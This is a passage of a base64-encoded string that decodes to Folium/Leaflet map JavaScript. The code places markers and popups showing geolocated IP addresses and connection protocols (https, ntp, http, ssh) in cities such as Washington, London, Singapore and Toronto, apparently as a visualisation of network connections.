l9lYzRmNzRmYjVlMWY0Y2QxYWUyYzcxMGE3MTllMDM3ZiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9kODExMWU0MjExMDk0ZWZkOWMxZWE5ZGI3Y2ViMzc0Ny5zZXRJY29uKGljb25fZWM0Zjc0ZmI1ZTFmNGNkMWFlMmM3MTBhNzE5ZTAzN2YpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfOGM3ZDY5MDZjN2Q1NDA0OTgzOGY1NDM0N2U4MTQ5ZmYgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9lZWZkODU3YTc2Y2M0MWQwODA5YTI0YTkzMGE0M2EyYyA9ICQoYDxkaXYgaWQ9Imh0bWxfZWVmZDg1N2E3NmNjNDFkMDgwOWEyNGE5MzBhNDNhMmMiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVVTLCBDb3VudHJ5TmFtZT1Vbml0ZWQgU3RhdGVzLCBTdGF0ZT1WaXJnaW5pYSwgQ2l0eT1XYXNoaW5ndG9uLCBMb25naXR1ZGU9LTc4LjE3MDQsIExhdGl0dWRlPTM4LjcxNjM8YnI+NTIuMjM5LjIyMC4zMjxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfOGM3ZDY5MDZjN2Q1NDA0OTgzOGY1NDM0N2U4MTQ5ZmYuc2V0Q29udGVudChodG1sX2VlZmQ4NTdhNzZjYzQxZDA4MDlhMjRhOTMwYTQzYTJjKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfZDgxMTFlNDIxMTA5NGVmZDljMWVhOWRiN2NlYjM3NDcuYmluZFBvcHVwKHBvcHVwXzhjN2Q2OTA2YzdkNTQwNDk4MzhmNTQzNDdlODE0OWZmKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9kODExMWU0MjExMDk0ZWZkOWMxZWE5ZGI3Y2ViMzc0Ny5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2U4ODliN2ZkNmY3ZTQ2MDViZGY2YjVkMmVjMWU1OWVhID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMzczYzczMGVlMmU4NDYzZGFhZmRjOWFlNWY3M2EzYjYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTg4OWI3ZmQ2ZjdlNDYwNWJkZjZiNWQyZWMxZTU5ZWEuc2V0SWNvbihpY29uXzM3M2M3MzBlZTJlODQ2M2RhYWZkYzlhZTVmNzNhM2I2KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzBkN2M1OTkxNGZkOTQ1YjE5YzYxZGNiM2I4NGM0Mzk4ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMzA3ZjFmOTNkMmY1NDQ1NzllNzgxZDIzMzM4NGQyODEgPSAkKGA8ZGl2IGlkPSJodG1sXzMwN2YxZjkzZDJmNTQ0NTc5ZTc4MWQyMzMzODRkMjgxIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuOTQuNDxicj5wcm90b2NvbD1udHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzBkN2M1OTkxNGZkOTQ1YjE5YzYxZGNiM2I4NGM0Mzk4LnNldENvbnRlbnQoaHRtbF8zMDdmMWY5M2QyZjU0NDU3OWU3ODFkMjMzMzg0ZDI4MSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2U4ODliN2ZkNmY3ZTQ2MDViZGY2YjVkMmVjMWU1OWVhLmJpbmRQb3B1cChwb3B1cF8wZDdjNTk5MTRmZDk0NWIxOWM2MWRjYjNiODRjNDM5OCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZTg4OWI3ZmQ2ZjdlNDYwNWJkZjZiNWQyZWMxZTU5ZWEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9bnRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfM2Q0N2EyNjY3ZGU4NDA1MmFlYzAwYzZlY2NkMDViYmYgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzUxLjUxNDIsIC0wLjA5MzFdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl81YmYwNThmMGJiOGE0M2JmYWEyYjJkNjZiY2MzYTNmNiA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl8zZDQ3YTI2NjdkZTg0MDUyYWVjMDBjNmVjY2QwNWJiZi5zZXRJY29uKGljb25fNWJmMDU4ZjBiYjhhNDNiZmFhMmIyZDY2YmNjM2EzZjYpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfM2IzYTRjMzEzMzRlNDRlZjk0NWM0NmMxNDMzYWU4ZGMgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF80MDUzYTA4MWViYTQ0ZWJlYWM5OTI1MDYwYjgxNjg3NyA9ICQoYDxkaXYgaWQ9Imh0bWxfNDA1M2EwODFlYmE0NGViZWFjOTkyNTA2MGI4MTY4NzciIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUdCLCBDb3VudHJ5TmFtZT1Vbml0ZWQgS2luZ2RvbSwgU3RhdGU9RW5nbGFuZCwgQ2l0eT1Mb25kb24sIExvbmdpdHVkZT0tMC4wOTMxLCBMYXRpdHVkZT01MS41MTQyPGJyPjkxLjE4OS45NC40PGJyPnByb3RvY29sPW50cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfM2IzYTRjMzEzMzRlNDRlZjk0NWM0NmMxNDMzYWU4ZGMuc2V0Q29udGVudChodG1sXzQwNTNhMDgxZWJhNDRlYmVhYzk5MjUwNjBiODE2ODc3KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfM2Q0N2EyNjY3ZGU4NDA1MmFlYzAwYzZlY2NkMDViYmYuYmluZFBvcHVwKHBvcHVwXzNiM2E0YzMxMzM0ZTQ0ZWY5NDVjNDZjMTQzM2FlOGRjKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8zZDQ3YTI2NjdkZTg0MDUyYWVjMDBjNmVjY2QwNWJiZi5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBMb25kb24sIFVuaXRlZCBLaW5nZG9tLCBwcm90b2NvbD1udHBgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl8wYzk5NWRjOWUwYzI0MTMwOTYwOWI3ODg1NjQ4MzQ4MCA9IEwubWFya2VyKAogICAgICAgICAgICBbMS4yOTMxLCAxMDMuODU1OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2RlODZkN2ZmNDYwZTRiMmVhYWIyOGQyODU3ZjkyZWY1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzBjOTk1ZGM5ZTBjMjQxMzA5NjA5Yjc4ODU2NDgzNDgwLnNldEljb24oaWNvbl9kZTg2ZDdmZjQ2MGU0YjJlYWFiMjhkMjg1N2Y5MmVmNSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF8xZWE5NjFiMjJlZDc0NWJlYjM0NWZhMjA5Yzc2MjA5YSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2ViYzI5MWUwZjcwZTQ1YTVhNDM0YzlkNTdhNDM1NmE5ID0gJChgPGRpdiBpZD0iaHRtbF9lYmMyOTFlMGY3MGU0NWE1YTQzNGM5ZDU3YTQzNTZhOSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9U0csIENvdW50cnlOYW1lPVNpbmdhcG9yZSwgU3RhdGU9Q2VudHJhbCBTaW5nYXBvcmUgQ29tbXVuaXR5IERldmVsb3BtZW50IENvdW5jaWwsIENpdHk9U2luZ2Fwb3JlLCBMb25naXR1ZGU9MTAzLjg1NTgsIExhdGl0dWRlPTEuMjkzMTxicj4xMy42Ny4zNS4xNzY8YnI+cHJvdG9jb2w9aHR0cDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMWVhOTYxYjIyZWQ3NDViZWIzNDVmYTIwOWM3NjIwOWEuc2V0Q29udGVudChodG1sX2ViYzI5MWUwZjcwZTQ1YTVhNDM0YzlkNTdhNDM1NmE5KTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMGM5OTVkYzllMGMyNDEzMDk2MDliNzg4NTY0ODM0ODAuYmluZFBvcHVwKHBvcHVwXzFlYTk2MWIyMmVkNzQ1YmViMzQ1ZmEyMDljNzYyMDlhKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8wYzk5NWRjOWUwYzI0MTMwOTYwOWI3ODg1NjQ4MzQ4MC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBTaW5nYXBvcmUsIFNpbmdhcG9yZSwgcHJvdG9jb2w9aHR0cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzAxOGNmNGM2YzE1ZjQxODY5MzdiOTgwYjAzZDRjYmUzID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0My42NjU1LCAtNzkuNDIwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzhkZDg0OTQzZWEwZDRjN2JiMTg3Y2Y4ODM5MWQ4MDJkID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzAxOGNmNGM2YzE1ZjQxODY5MzdiOTgwYjAzZDRjYmUzLnNldEljb24oaWNvbl84ZGQ4NDk0M2VhMGQ0YzdiYjE4N2NmODgzOTFkODAyZCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF9iNGI2N2NlODM3MWE0OTdhYjUzMDMzNjZmNWY4YmI0ZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2I4Y2VkN2VjMmExOTQyN2I5ZDU4NTU2YTRlYThhY2VkID0gJChgPGRpdiBpZD0iaHRtbF9iOGNlZDdlYzJhMTk0MjdiOWQ1ODU1NmE0ZWE4YWNlZCIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9Q0EsIENvdW50cnlOYW1lPUNhbmFkYSwgU3RhdGU9T250YXJpbywgQ2l0eT1Ub3JvbnRvLCBMb25naXR1ZGU9LTc5LjQyMDQsIExhdGl0dWRlPTQzLjY2NTU8YnI+MTMuNzEuMTcyLjEzMDxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfYjRiNjdjZTgzNzFhNDk3YWI1MzAzMzY2ZjVmOGJiNGUuc2V0Q29udGVudChodG1sX2I4Y2VkN2VjMmExOTQyN2I5ZDU4NTU2YTRlYThhY2VkKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfMDE4Y2Y0YzZjMTVmNDE4NjkzN2I5ODBiMDNkNGNiZTMuYmluZFBvcHVwKHBvcHVwX2I0YjY3Y2U4MzcxYTQ5N2FiNTMwMzM2NmY1ZjhiYjRlKQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl8wMThjZjRjNmMxNWY0MTg2OTM3Yjk4MGIwM2Q0Y2JlMy5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBUb3JvbnRvLCBDYW5hZGEsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfOWI5YjY3OTVjYzIxNDQ5NzlhNzNiNzI4NWFkNTBiNmEgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzQzLjY2NTUsIC03OS40MjA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZGNmMWM3YTMzMjIyNDhhYWJhMWQ2ZDEzMTFlMWMyNTUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfOWI5YjY3OTVjYzIxNDQ5NzlhNzNiNzI4NWFkNTBiNmEuc2V0SWNvbihpY29uX2RjZjFjN2EzMzIyMjQ4YWFiYTFkNmQxMzExZTFjMjU1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzAxODBhNjVmOGM1ODQwMjQ4NTJiY2ViY2RmZDRjNjUwID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMzZlMzljZWUyMjczNDllODg4Yzk0ZmExOWViMWZjN2QgPSAkKGA8ZGl2IGlkPSJodG1sXzM2ZTM5Y2VlMjI3MzQ5ZTg4OGM5NGZhMTllYjFmYzdkIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1DQSwgQ291bnRyeU5hbWU9Q2FuYWRhLCBTdGF0ZT1PbnRhcmlvLCBDaXR5PVRvcm9udG8sIExvbmdpdHVkZT0tNzkuNDIwNCwgTGF0aXR1ZGU9NDMuNjY1NTxicj4xMy44OC4yNTUuMTE1PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF8wMTgwYTY1ZjhjNTg0MDI0ODUyYmNlYmNkZmQ0YzY1MC5zZXRDb250ZW50KGh0bWxfMzZlMzljZWUyMjczNDllODg4Yzk0ZmExOWViMWZjN2QpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl85YjliNjc5NWNjMjE0NDk3OWE3M2I3Mjg1YWQ1MGI2YS5iaW5kUG9wdXAocG9wdXBfMDE4MGE2NWY4YzU4NDAyNDg1MmJjZWJjZGZkNGM2NTApCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzliOWI2Nzk1Y2MyMTQ0OTc5YTczYjcyODVhZDUwYjZhLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFRvcm9udG8sIENhbmFkYSwgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl9lNWU5Yzk2NGEyM2I0MzY4YTNlZTEwMjYyNmFhZmU2MyA9IEwubWFya2VyKAogICAgICAgICAgICBbMS4yOTMxLCAxMDMuODU1OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzg4YmU0ZDU5MWFhYjRiYmY4MjQyNWVjZDdhMzg1MDdjID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdwdXJwbGUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTVlOWM5NjRhMjNiNDM2OGEzZWUxMDI2MjZhYWZlNjMuc2V0SWNvbihpY29uXzg4YmU0ZDU5MWFhYjRiYmY4MjQyNWVjZDdhMzg1MDdjKTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzUxOGM0ODMzMzg4NjQ3ZTVhMWMyZmIyOTAyZTM0OWM4ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfY2JjZDgwNmE1NDIxNGY3ZWJkNWE4YzhlMzNjNTE2M2UgPSAkKGA8ZGl2IGlkPSJodG1sX2NiY2Q4MDZhNTQyMTRmN2ViZDVhOGM4ZTMzYzUxNjNlIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1TRywgQ291bnRyeU5hbWU9U2luZ2Fwb3JlLCBTdGF0ZT1DZW50cmFsIFNpbmdhcG9yZSBDb21tdW5pdHkgRGV2ZWxvcG1lbnQgQ291bmNpbCwgQ2l0eT1TaW5nYXBvcmUsIExvbmdpdHVkZT0xMDMuODU1OCwgTGF0aXR1ZGU9MS4yOTMxPGJyPjIzLjk3LjYwLjIxNDxicj5wcm90b2NvbD1zc2g8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzUxOGM0ODMzMzg4NjQ3ZTVhMWMyZmIyOTAyZTM0OWM4LnNldENvbnRlbnQoaHRtbF9jYmNkODA2YTU0MjE0ZjdlYmQ1YThjOGUzM2M1MTYzZSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2U1ZTljOTY0YTIzYjQzNjhhM2VlMTAyNjI2YWFmZTYzLmJpbmRQb3B1cChwb3B1cF81MThjNDgzMzM4ODY0N2U1YTFjMmZiMjkwMmUzNDljOCkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZTVlOWM5NjRhMjNiNDM2OGEzZWUxMDI2MjZhYWZlNjMuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgU2luZ2Fwb3JlLCBTaW5nYXBvcmUsIHByb3RvY29sPXNzaGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzY3ZmQyYWI2ZDdiMjRhY2Y4ZmYyOGVlNDc1ODNiZTA3ID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFsxLjI5MzEsIDEwMy44NTU4XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fZjAwNmNhZGQxMzU0NDE5ZmFhNzE2MTBhMWRlYjFmZWUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ3B1cnBsZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl82N2ZkMmFiNmQ3YjI0YWNmOGZmMjhlZTQ3NTgzYmUwNy5zZXRJY29uKGljb25fZjAwNmNhZGQxMzU0NDE5ZmFhNzE2MTBhMWRlYjFmZWUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfMzI3ODVlYjg1Nzc5NDU0YzhkMDg3MDdhMzIzODY4ODcgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9jZGI0OTE0ZDIxMDE0ZDAxYjNhMDRmODcwYTFlNjdkMCA9ICQoYDxkaXYgaWQ9Imh0bWxfY2RiNDkxNGQyMTAxNGQwMWIzYTA0Zjg3MGExZTY3ZDAiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPVNHLCBDb3VudHJ5TmFtZT1TaW5nYXBvcmUsIFN0YXRlPUNlbnRyYWwgU2luZ2Fwb3JlIENvbW11bml0eSBEZXZlbG9wbWVudCBDb3VuY2lsLCBDaXR5PVNpbmdhcG9yZSwgTG9uZ2l0dWRlPTEwMy44NTU4LCBMYXRpdHVkZT0xLjI5MzE8YnI+MTMuNjcuMzUuMTc2PGJyPnByb3RvY29sPXNzaDwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMzI3ODVlYjg1Nzc5NDU0YzhkMDg3MDdhMzIzODY4ODcuc2V0Q29udGVudChodG1sX2NkYjQ5MTRkMjEwMTRkMDFiM2EwNGY4NzBhMWU2N2QwKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfNjdmZDJhYjZkN2IyNGFjZjhmZjI4ZWU0NzU4M2JlMDcuYmluZFBvcHVwKHBvcHVwXzMyNzg1ZWI4NTc3OTQ1NGM4ZDA4NzA3YTMyMzg2ODg3KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl82N2ZkMmFiNmQ3YjI0YWNmOGZmMjhlZTQ3NTgzYmUwNy5iaW5kVG9vbHRpcCgKI